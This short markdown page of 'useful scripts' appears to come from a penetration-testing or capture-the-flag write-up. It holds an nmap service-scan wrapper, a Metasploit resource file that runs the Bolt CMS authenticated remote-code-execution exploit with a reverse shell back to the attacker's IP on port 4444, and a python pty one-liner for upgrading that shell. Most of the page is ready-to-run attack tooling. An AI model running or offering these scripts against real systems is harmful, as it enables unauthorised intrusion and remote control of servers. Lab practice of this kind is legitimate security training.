# 🛠️ Useful Scripts

## Scripts I Used

### Nmap Quick Scan

```bash
#!/bin/bash
# scan.sh
# Usage: ./scan.sh <target_ip>

echo "🔍 Scanning $1..."
nmap -sV -sC $1
echo "✅ Done!"
```

### Metasploit Auto-Run

```bash
#!/bin/bash
# bolt_exploit.rc
# Usage: msfconsole -q -r bolt_exploit.rc

use exploit/unix/webapp/bolt_authenticated_rce
set RHOSTS <TARGET_IP>
set USERNAME <USERNAME>
set PASSWORD <PASSWORD>
set LHOST <YOUR_IP>
set LPORT 4444
exploit
```

### Shell Upgrade

```bash
#!/bin/bash
# upgrade.sh
# Run this after getting a shell

python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

**Made with 💜 by Swoyon**
